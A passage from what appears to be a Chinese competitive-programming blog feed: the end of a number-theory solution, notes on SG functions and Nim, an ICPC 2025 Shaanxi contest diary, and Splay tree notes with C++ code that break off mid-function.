&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">1</span>, r = <span class="number">0</span>; l &lt;= i; l = r + <span class="number">1</span>) &#123;</span><br><span class="line">            r = i / (i / l);</span><br><span class="line">            sum[i] += (<span class="type">long</span> <span class="type">long</span>)(r - l + <span class="number">1</span>) * (i / l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">long</span> <span class="type">long</span> <span class="title">f</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">1</span>, r = <span class="number">0</span>; l &lt;= std::<span class="built_in">min</span>(n, m); l = r + <span class="number">1</span>) &#123;</span><br><span class="line">        r = std::<span class="built_in">min</span>(n / (n / l), m / (m / l));</span><br><span class="line">        ans += (sumMu[r] - sumMu[l - <span class="number">1</span>]) * sum[n / l] * sum[m / l];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">getPrimes</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">        <span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">f</span>(n, m));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>线性筛</tag>
        <tag>莫比乌斯反演</tag>
        <tag>SDOI</tag>
        <tag>2015</tag>
      </tags>
  </entry>
  <entry>
    <title>SG 函数学习笔记</title>
    <url>/sg-notes/</url>
    <content><![CDATA[<p>SG 函数是解决博弈论问题的一种方法。</p>
<h1 id="博弈论概念">博弈论概念</h1>
<h2 id="公平组合游戏">公平组合游戏</h2>
<p>首先我们需要了解以下几个概念。</p>
<p>公平组合游戏指的是一类满足下列条件的游戏：</p>
<ol type="1">
<li>有两名玩家交替操作；</li>
<li>每名玩家可用的操作与玩家的先后无关；</li>
<li>无法移动的玩家判负。</li>
</ol>
<span id="more"></span>
<p>如 Nim
游戏就属于公平组合游戏。而像绝大多数棋类游戏则不是公平组合游戏，因为玩家只能操作黑棋或白棋子，不满足条件
<span class="math inline">\(2\)</span>，且判负也不满足条件 <span
class="math inline">\(3\)</span>。</p>
<p>我们将公平组合游戏中先操作的人叫做先手，之后操作的叫做后手。</p>
<h2 id="有向图游戏">有向图游戏</h2>
<p>对于一张
DAG（有向无环图），图中仅有唯一起点，在起点上有一枚棋子，两名玩家交替移动这枚棋子，无法移动的玩家判负。这样的游戏成为有向图游戏。</p>
<p>我们可以发现：公平组合游戏可转化为有向图游戏，其中节点表示状态，边表示状态转移。</p>
<p>SG 函数则可以解决有向图游戏中先手是否有必胜策略的问题。</p>
<h1 id="nim-游戏">Nim 游戏</h1>
<p>Nim 游戏可参照 <a
href="https://www.luogu.com.cn/problem/P2197">洛谷题面</a>。简单而言就是有
<span class="math inline">\(n\)</span> 堆石子 <span
class="math inline">\(a_n\)</span>，两人交替取石子。每次可从任意一堆中取走任意数量的石子，且不能不取。取完所有石子的玩家获胜，问先手是否有必胜策略。</p>
<p>这里可以引出一个 Nim 游戏的定理：Nim 博弈先手必胜，当且仅当 <span
class="math inline">\(\oplus_{i = 1}^n{a_i} &gt; 0\)</span>（<span
class="math inline">\(\oplus_{i = 1}^n{a_i}\)</span> 表示 <span
class="math inline">\(a_n\)</span> 的异或和）。</p>
<p>证明：首先当所有石子取完时必败，此时 <span
class="math inline">\(\oplus_{i = 1}^n{a_i} = 0\)</span>。然后对于任意
<span class="math inline">\(\oplus_{i = 1}^n{a_i} = 0\)</span>
的局面，显然无论怎么取石子，都会使 <span class="math inline">\(\oplus_{i
= 1}^n{a_i} \ne 0\)</span>；对于任意 <span
class="math inline">\(\oplus_{i = 1}^n{a_i} \ne 0\)</span>
的局面，只要我们选择石头最多的那一堆，都可以一步变化为 <span
class="math inline">\(\oplus_{i = 1}^n{a_i} = 0\)</span> 的局面。</p>
<p>于是我们可以使用数学归纳法证明：</p>
<ul>
<li>当 <span class="math inline">\(\oplus_{i = 1}^n{a_i} &gt; 0\)</span>
时，先手只要每次选石子时将局面变化至 <span
class="math inline">\(\oplus_{i = 1}^n{a_i} =
0\)</span>，后手只能将局面变化成 <span class="math inline">\(\oplus_{i =
1}^n{a_i} &gt; 0\)</span>。又由于石子总数总能减小，且 <span
class="math inline">\(\oplus_{i = 1}^n{a_i} &gt; 0\)</span>
时肯定有剩余石子，于是可导致最后的石子被先手拿走。</li>
<li>当 <span class="math inline">\(\oplus_{i = 1}^n{a_i} = 0\)</span>
时，先手无论如何都只能将状态变化为 <span class="math inline">\(\oplus_{i
= 1}^n{a_i} &gt;
0\)</span>，于是后手就可以用上述相同的方法拿走最后石子，故先手必败。</li>
</ul>
<h1 id="sg-函数">SG 函数</h1>
<h2 id="mex-运算">mex 运算</h2>
<p>我们首先定义一种运算 mex。设 <span class="math inline">\(S\)</span>
表示一个非负整数即可，<span
class="math inline">\(\operatorname{mex}(S)\)</span> 即为不属于 <span
class="math inline">\(S\)</span> 的最小非负整数。可用下列等式表示：</p>
<p><span class="math display">\[
\operatorname{mex}(S) = \min\limits_{x \in \complement_\mathbb{N}S}
\{x\}
\]</span></p>
<h2 id="概念">概念</h2>
<p>在有向图游戏中，假设从节点 <span class="math inline">\(u\)</span>
可一步到达的节点集合为 <span class="math inline">\(E_u\)</span>，定义 SG
函数为 <span class="math inline">\(E\)</span> 中所有节点的 SG
函数值的集合的 <span class="math inline">\(\text{mex}\)</span>
运算。即为下列等式：</p>
<p><span class="math display">\[
\operatorname{SG}(u) = \operatorname{mex}(\{ x | x =
\operatorname{SG}(v), v \in E_u \})
\]</span></p>
<p>当 <span class="math inline">\(u\)</span> 没有可出的节点时，我们定义
<span class="math inline">\(\operatorname{SG}(u) = 0\)</span>。</p>
<p>特别得，我们定义整个有向图游戏 <span class="math inline">\(G\)</span>
的 SG 函数值为该游戏的起点节点 <span class="math inline">\(s\)</span> 的
SG 函数值，即 <span class="math inline">\(\operatorname{SG}(G) =
\operatorname{SG}(s)\)</span>。</p>
<h2 id="性质">性质</h2>
<h3 id="胜负性质">胜负性质</h3>
<p>我们可以得到下列性质：</p>
<ul>
<li>对于有向图游戏 <span class="math inline">\(G\)</span>，当 <span
class="math inline">\(\operatorname{SG}(G) &gt; 0\)</span>
时，先手必胜；</li>
<li>对于有向图游戏 <span class="math inline">\(G\)</span>，当 <span
class="math inline">\(\operatorname{SG}(G) = 0\)</span>
时，先手必败。</li>
</ul>
<p>证明：首先对于一个没有出度的点 <span
class="math inline">\(u\)</span>，满足 <span
class="math inline">\(\operatorname{SG}(u) = 0\)</span>
且该状态必败。于是我们可以使用数学归纳法证明：</p>
<ul>
<li>对于节点 <span
class="math inline">\(u\)</span>，存在可一步到达的节点 <span
class="math inline">\(v\)</span> 且 <span
class="math inline">\(\operatorname{SG}(v) = 0\)</span> 时，说明 <span
class="math inline">\(SG(u) &gt; 0\)</span>，且此时玩家可将状态移动到
<span class="math inline">\(v\)</span> 以达到必胜。</li>
<li>对于节点 <span class="math inline">\(u\)</span>，可一步到达的节点
<span class="math inline">\(v\)</span> 均满足 <span
class="math inline">\(\operatorname{SG}(v) &gt; 0\)</span> 时，说明
<span class="math inline">\(\operatorname{SG}(x) =
0\)</span>，且此时无论玩家怎么移动都会将状态转移到后一个玩家必胜的状态，即当前玩家必败。</li>
</ul>
<h3 id="有向图游戏的和">有向图游戏的和</h3>
<p>对于一种有向图游戏 <span class="math inline">\(G\)</span>，设 <span
class="math inline">\(G\)</span> 包含 <span
class="math inline">\(n\)</span> 种有向图游戏 <span
class="math inline">\(H_n\)</span>，玩家每次操作为任意选择一个 <span
class="math inline">\(H_i\)</span> 进行一次操作，则 <span
class="math inline">\(G\)</span> 被称为有向图游戏 <span
class="math inline">\(H_{1 \cdots n}\)</span> 的和，它的 SG
函数值满足下列等式：</p>
<p><span class="math display">\[
\operatorname{SG}(G) = \oplus_{i = 1}^n{\operatorname{SG}(H_i)}
\]</span></p>
<p>证明方法与 Nim 游戏的证明方法类似。</p>
]]></content>
      <categories>
        <category>OI</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>学习笔记</tag>
        <tag>数学</tag>
        <tag>博弈论</tag>
        <tag>SG 函数</tag>
      </tags>
  </entry>
  <entry>
    <title>ICPC 2025 陕西省赛 游记</title>
    <url>/sncpc-2025/</url>
    <content><![CDATA[<p>上大学以来第一场，或许也是最后一场
ICPC。或许以后会离算法竞赛越来越远吧。</p>
<span id="more"></span>
<h1 id="day-x-x-in-mathbbz_leq-0">Day <span class="math inline">\(x, \ x
\in \mathbb{Z}_{\leq 0}\)</span></h1>
<p>在水群时发现学校的 ACM
大群发了省赛报名，犹豫了一下决定报名。看到群里面有人找队友马上就去联系了。</p>
<p>考试前夕发现省赛和程序设计基础的期末考试撞了，为了补考还麻烦去申请了盖章的参赛证明
<del>泥交稳定发挥</del>。在五一时和队友训练了两三场
<del>然后被各种唐氏问题折磨，打铁++</del>。</p>
<h1 id="day-1">Day 1</h1>
<p>考试那天早期赶地铁，和队友到西电签到，拍了几张照就赶过去看热身赛了。<del>然而到场的时候已经开始
30min 了</del> 看了一眼榜决定写
A，然而想了一会儿没啥特别的思路，通读了所有题反而发现 B
更简单，在封榜的时候 A 了。</p>
<p>接下来是正式赛，三人分三组找签到题。先看到了 A 题和 C 题比较签，C
题观察了一会儿找出做法就是不停找 <span
class="math inline">\(\gcd\)</span>，10min 交了一发过了。这时看榜开
L，观察了一下猜答案是平均数，和队友讨论了一下确定结论，交了一发过了。</p>
<p>接下来看榜跟 J 题和 G 题。J 题看了一眼不太擅长就交给队友做了，G
题摸索一下找个最大值最小值，把队友从机子上赶下来快速写完过掉。<del>甚至此时冲到了
rank3，如此美妙的开局！</del> 接下来就开始想
A，不难发现按照颜色分类，处理成区间计算相邻的距离即可，<del>于是又把在写
C 的队友赶下来</del> 进行实现，简单 debug 之后交上去过掉。</p>
<p>看榜开 K
题，看着像博弈论，算了一下把结果处理成分段函数，两段都是一次函数好计算极值，<del>于是双把在写
J 的队友赶下来</del> 进行实现，交了一发 WA
掉，把代码打印下来，边吃发的麦麦 <del>这薯条是真难吃啊</del> 边
debug，发现边界情况处理错了，<del>于是叒把在写 J 的队友赶下来</del>
改掉交上去过掉。</p>
<p>看榜单剩下的就是 C 题和 D 题了，看着并没有特别的思路，看队友在给 J 题
debug 就给队友造了几个 J 的样例
<del>然后非常不幸地都是正确的</del>。于是想了一下 CD
推了一下性质，推的时候队友找到问题就把 J
题过了。依然没有什么思路于是再读了遍题 <del>然后发现眼瞎第一遍没读 D
的数据范围</del>，读了之后马上确定 D 题是状压 DP，写了一会儿交上去 WA
了。此时已经基本燃尽了，也快封榜了。造了好几个样例都没发现问题。结果最后造了个小样例发现初始状态没处理好，马上改了之后在封榜时把
D 题过了。</p>
<p>接下来看滚榜，过题不算很多且罚时不太优，预料到大概率是银首。不出所料结果正式队伍
rank 22，银牌 rank 6，在近乎单挑的情况下算是尽力了。上台领奖拿到了第一个
ICPC 牌子。</p>
<p><del>于是接下来回学校紧锣密鼓地补数学作业……</del></p>
<p><del>之后看了一下 C 发现就是一道 SB 暴搜题，痛失金牌 QAQ</del></p>
<h1 id="day-x-x-in-mathbbz_-1">Day <span class="math inline">\(x, \ x
\in \mathbb{Z}_{&gt; 1}\)</span></h1>
<p>现在回头看，大学最终读了数学专业，似乎和 CS
相关但现在看来本科阶段关系甚小，课内知识虽说能掌握但耗费精力巨大。在远离算法竞赛许久后回归却发现并不能跟得上
ICPC
所需的水平。在后续课内和其他的压力下，算法竞赛也只会越来越远吧。</p>
<p>开学后开始学习专业课，却发现数分高代学起来并不容易。一方面挣扎于数学，另一方面却也看到了同学有且不止专业课的耀眼成绩，越发觉得自己平凡。看着变幻莫测的强基政策和不确定的未来，自己想得太多，一直纠结于不少事情，又做得太少，导致一直以来精神状态挺“丧”的。</p>
<p>高考发挥得不错来到了一所好学校，也要开始接受自己的平凡吧。算法竞赛估计以后没时间也不太会碰了，就看以后在这所学校的六七年能活出怎样的色彩吧。</p>
]]></content>
      <categories>
        <category>日常</category>
        <category>行记</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>行记</tag>
        <tag>ICPC</tag>
        <tag>2025</tag>
      </tags>
  </entry>
  <entry>
    <title>Splay 学习笔记</title>
    <url>/splay-notes/</url>
    <content><![CDATA[<p>一文概括 Splay</p>
<p><del>长文预警</del></p>
<h1 id="平衡树">平衡树</h1>
<p>Splay
是一种平衡树，可以解决很多序列问题。而平衡树是一种二叉搜索树。</p>
<p>二叉搜索树则是一种数据结构，对于每一个节点，权值满足左儿子小于根节点小于右儿子，且整棵树的中序遍历是排序后的序列。这样二叉搜索树就可以解决很多问题，其时间复杂度取决于树的深度。</p>
<p>于是这里可以引出一种调试平衡树的常见方法：输出这棵树的中序遍历，看中序遍历是否为排序后序列。</p>
<p>然而在特殊数据下，二叉搜索树很容易退化成一颗链，于是就有了一种优化版本：平衡树。平衡树可以让二叉搜索树随时变化，以求深度保持相对较小，即“平衡”。而
Splay 就是一种平衡树。</p>
<span id="more"></span>
<p>如左图是一颗退化成链的二叉搜索树，右图为一颗平衡树。</p>
<img src="/splay-notes/balanced_tree.png" class="">
<h1 id="平衡操作">平衡操作</h1>
<h2 id="旋转">旋转</h2>
<p>Splay
有很多操作，其中旋转操作最为基本的操作之一。旋转分为左旋和右旋。左旋是将一个节点和它的左儿子互换位置，右旋是将一个点和它右儿子互换位置；同时保持中序遍历不变且仍然是一颗排序二叉树。方式如下图（接下来的图片都是使用
Windows 画图鼠绘，画的不好请见谅）：</p>
<img src="/splay-notes/rotate.png" class="">
<p>合理运用旋转可以让整棵树保持平衡。</p>
<h2 id="splay-操作">Splay 操作</h2>
<p>顾名思义，Splay 操作是 Splay
最重要的操作之一，也是最具有特点的操作。</p>
<p>Splay 操作为将一个点通过旋转移到指定的点的儿子。假设我们需要将 <span
class="math inline">\(x\)</span> 旋转至 <span
class="math inline">\(y\)</span> 的儿子（若不指定 <span
class="math inline">\(y\)</span> 则为将 <span
class="math inline">\(x\)</span> 旋转至根节点），同时 <span
class="math inline">\(x\)</span> 与 <span
class="math inline">\(y\)</span> 之间间隔节点 <span
class="math inline">\(A\)</span>（距离 <span
class="math inline">\(x\)</span> 更近）、<span
class="math inline">\(B\)</span>（距离 <span
class="math inline">\(y\)</span> 更近），则有 <span
class="math inline">\(4\)</span> 种情况：</p>
<ol type="1">
<li><span class="math inline">\(A\)</span> 为 <span
class="math inline">\(y\)</span> 的左儿子，<span
class="math inline">\(x\)</span> 为 <span
class="math inline">\(y\)</span> 的左儿子；</li>
<li><span class="math inline">\(A\)</span> 为 <span
class="math inline">\(y\)</span> 的右儿子，<span
class="math inline">\(x\)</span> 为 <span
class="math inline">\(y\)</span> 的右儿子；</li>
<li><span class="math inline">\(A\)</span> 为 <span
class="math inline">\(y\)</span> 的左儿子，<span
class="math inline">\(x\)</span> 为 <span
class="math inline">\(y\)</span> 的右儿子；</li>
<li><span class="math inline">\(A\)</span> 为 <span
class="math inline">\(y\)</span> 的右儿子，<span
class="math inline">\(x\)</span> 为 <span
class="math inline">\(y\)</span> 的左儿子。</li>
</ol>
<p>由于 <span class="math inline">\(1\)</span> 与 <span
class="math inline">\(2\)</span>、<span class="math inline">\(3\)</span>
与 <span class="math inline">\(4\)</span>
情况基本相同，操作对称。于是我们只需要将 Splay 分为操作 <span
class="math inline">\(1\)</span>、<span class="math inline">\(3\)</span>
两类。Splay 具体操作如下：</p>
<ul>
<li>第 <span class="math inline">\(1\)</span> 种情况：<span
class="math inline">\(A\)</span> 向上旋转，<span
class="math inline">\(x\)</span> 向上旋转。这种操作称作 zig-zag
操作。</li>
</ul>
<img src="/splay-notes/zig-zag.png" class="">
<ul>
<li>第 <span class="math inline">\(3\)</span> 种情况：<span
class="math inline">\(x\)</span> 向上旋转，<span
class="math inline">\(x\)</span> 向上旋转。这种操作称作 zig-zig
操作。</li>
</ul>
<img src="/splay-notes/zig-zig.png" class="">
<p>若想将 <span class="math inline">\(x\)</span> 转至 <span
class="math inline">\(y\)</span> 的儿子，只需要不停进行该操作即可。</p>
<p>为了让整颗树尽量保持平衡，<strong>我们需要在每次点操作后都将其 Splay
操作旋转至根节点</strong>。</p>
<p>已经过证明：使用 Splay 操作旋转节点，可将该平衡树操作时间复杂度降至
<span class="math inline">\(O(\log n)\)</span>，证明略。</p>
<h1 id="二叉搜索树操作">二叉搜索树操作</h1>
<p>接下来将介绍 Splay 在二叉搜索树种的应用。模板：<a
href="https://www.luogu.com.cn/problem/P3369">洛谷 P3369
普通平衡树</a></p>
<p>为了方便，我们可以先加入 <span
class="math inline">\(+\infty\)</span>、<span
class="math inline">\(-\infty\)</span> 两点。</p>
<h2 id="插入操作">插入操作</h2>
<p>由于是二叉搜索树，我们可从根节点开始遍历。每到一个点就看若小于这个节点，就进入左儿子；大于这个节点，就进入右儿子。直到找到的儿子为空，就将其插入至该节点。</p>
<p>插入后为保持平衡，需要将插入的节点 Splay 操作至根节点。</p>
<h2 id="查询排名操作">查询排名操作</h2>
<p>查询排名使用 Splay 有一种很方便的方法。我们可以把要查询的节点 Splay
至根，排名即为左子树大小。</p>
<h2 id="查询第-k-大操作">查询第 <span class="math inline">\(k\)</span>
大操作</h2>
<p>根开始遍历。每到一个点就看这个点的左子树大小：如果大于 <span
class="math inline">\(k\)</span>，就进入左子树；如果小于 <span
class="math inline">\(k\)</span>，就先将 <span
class="math inline">\(k\)</span> 减去左子树大小和根节点大小，若 <span
class="math inline">\(k \le 0\)</span> 就返回该点，否则进入右子树查询第
<span class="math inline">\(k\)</span> 大。</p>
<p>查询完后，将查询到的点 Splay 到根。</p>
<h2 id="查询前驱-后继">查询前驱 / 后继</h2>
<p>查询前驱 / 后继当然有其他方法，但在 Splay 中有特殊的方法。</p>
<p>我们可以把将要查询的点 Splay
操作至根节点。查询前驱即查询左子树的最右端点，查询后继则是查询右子树的最左端点。</p>
<p>查完前驱 / 后继后，将查询到的点 Splay 到根。</p>
<h2 id="删除">删除</h2>
<p>由于 Splay 的特性，我们可以利用特殊方法删除节点。</p>
<p>我们可以先求出这个点的前驱和后继，然后将前驱 Splay
操作至根节点，然后将后继 Splay
操作至前驱的儿子。显然现在前驱的右儿子是后继，左子树只有要删除的一个点。于是接下来直接删除该点即可。</p>
<h1 id="二叉搜索树代码实现">二叉搜索树代码实现</h1>
<h2 id="节点操作">节点操作</h2>
<p>对于每个节点，我们需要存储它的儿子、父亲、值、子树大小、值的出现次数以及根节点。</p>
<p>首先我们可以写一些像是更新子树大小这类常用函数备用。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    Node *ch[<span class="number">2</span>], *fa, **root;</span><br><span class="line">    T x;</span><br><span class="line">    <span class="type">int</span> size, count;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Node</span>(Node *fa, Node **root, T x) : <span class="built_in">fa</span>(fa), <span class="built_in">root</span>(root), <span class="built_in">x</span>(x), <span class="built_in">count</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        ch[<span class="number">0</span>] = ch[<span class="number">1</span>] = <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">Node</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (ch[<span class="number">0</span>]) <span class="keyword">delete</span> ch[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (ch[<span class="number">1</span>]) <span class="keyword">delete</span> ch[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">maintain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        size = (ch[<span class="number">0</span>] ? ch[<span class="number">0</span>]-&gt;size : <span class="number">0</span>) + (ch[<span class="number">1</span>] ? ch[<span class="number">1</span>]-&gt;size : <span class="number">0</span>) + count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">relation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span> == fa-&gt;ch[<span class="number">0</span>] ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lSize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ch[<span class="number">0</span>] ? ch[<span class="number">0</span>]-&gt;size : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; *root;</span><br></pre></td></tr></table></figure>
<h3 id="旋转-1">旋转</h3>
<p>按照上述的旋转思路直接模拟即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Node *o = fa;</span><br><span class="line">    <span class="type">int</span> r = <span class="built_in">relation</span>();</span><br><span class="line"></span><br><span class="line">    fa = o-&gt;fa;</span><br><span class="line">    <span class="keyword">if</span> (fa) fa-&gt;ch[o-&gt;<span class="built_in">relation</span>()] = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">    o-&gt;ch[r] = ch[r ^ <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (ch[r ^ <span class="number">1</span>]) ch[r ^ <span class="number">1</span>]-&gt;fa = o;</span><br><span class="line"></span><br><span class="line">    ch[r ^ <span class="number">1</span>] = o;</span><br><span class="line">    o-&gt;fa = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fa) *root = <span class="keyword">this</span>;</span><br><span class="line">    o-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">    <span class="built_in">maintain</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="splay-操作-1">Splay 操作</h3>
<p>按上述方法直接模拟。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">splay</span><span class="params">(Node *targetFa = <span class="literal">nullptr</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (fa != targetFa) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fa-&gt;fa == targetFa) <span class="built_in">rotate</span>();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (fa-&gt;<span class="built_in">relation</span>() == <span class="built_in">relation</span>()) &#123;</span><br><span class="line">            fa-&gt;<span class="built_in">rotate</span>();</span><br><span class="line">            <span class="built_in">rotate</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">rotate</span>();</span><br><span class="line">            <span class="built_in">rotate</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="查询节点的前驱-后继">查询节点的前驱 / 后继</h3>
<p>直接将查询的点 Splay 至根即可。</p>
<p>注意查询后将查询到的点 Splay 到根，否则可能会被卡常。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Node *<span class="title">pred</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">splay</span>();</span><br><span class="line">    Node *v = ch[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">while</span> (v-&gt;ch[<span class="number">1</span>]) v = v-&gt;ch[<span class="number">1</span>];</span><br><span class="line">    v-&gt;<span class="built_in">splay</span>();</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Node *<span class="title">succ</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">splay</span>();</span><br><span class="line">    Node *v = ch[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span> (v-&gt;ch[<span class="number">0</span>]) v = v-&gt;ch[<span class="number">0</span>];</span><br><span class="line">    v-&gt;<span class="built_in">splay</span>();</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二叉搜索树操作-1">二叉搜索树操作</h2>
<h3 id="建树-删树">建树 / 删树</h3>
<p>建树时插入两 <span class="math inline">\(\infty\)</span> 点即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Splay</span>() : <span class="built_in">root</span>(<span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="built_in">insert</span>(INF);</span><br><span class="line">    <span class="built_in">insert</span>(-INF);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">Splay</span>() &#123;</span><br><span class="line">    <span class="keyword">delete</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="查找指定值所在节点">查找指定值所在节点</h3>
<p>就像二叉搜索树这样搜索即可。从根节点开始遍历。每到一个点就看若小于这个节点，就进入左儿子；大于这个节点，就进入右儿子，直到找到该值即可。</p>
<p>注意找到后将找到的点 Splay 至根。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Node *<span class="title">find</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">    Node *v = root;</span><br><span class="line">    <span class="keyword">while</span> (v &amp;&amp; x != v-&gt;x) &#123;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; v-&gt;x) v = v-&gt;ch[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> v = v-&gt;ch[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!v) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    v-&gt;<span class="built_in">splay</span>();</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="插入节点">插入节点</h3>
<p>查找节点，如果查找到节点，则出现次数 <span
class="math inline">\(+1\)</span>，否则就用上述方法插入该节点。</p>
<p>最后将插入的节点 Splay 至根。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Node *<span class="title">insert</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">    Node *v = <span class="built_in">find</span>(x);</span><br><span class="line">    <span class="keyword">if</span> (v) &#123;</span><br><span class="line">        v-&gt;count++;</span><br><span class="line">        v-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Node **target = &amp;root, *fa = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (*target) &#123;</span><br><span class="line">        fa = *target;</span><br><span class="line">        fa-&gt;size++;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; fa-&gt;x) target = &amp;fa-&gt;ch[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> target = &amp;fa-&gt;ch[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *target = <span class="keyword">new</span> <span class="built_in">Node</span>(fa, &amp;root, x);</span><br><span class="line">    (*target)-&gt;<span class="built_in">splay</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="删除节点">删除节点</h3>
<p>若出现次数大于 <span class="math inline">\(1\)</span>，则出现次数
<span
class="math inline">\(-1\)</span>。否则指定节点就用上述方法删除即可。</p>
<p>若指定值则可先查询后删除。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">erase</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">erase</span>(<span class="built_in">find</span>(x));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">erase</span><span class="params">(Node *v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (v-&gt;count != <span class="number">1</span>) &#123;</span><br><span class="line">        v-&gt;<span class="built_in">splay</span>();</span><br><span class="line">        v-&gt;count--;</span><br><span class="line">        v-&gt;<span class="built_in">maintain</span>();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Node *pred = v-&gt;<span class="built_in">pred</span>();</span><br><span class="line">    Node *succ = v-&gt;<span 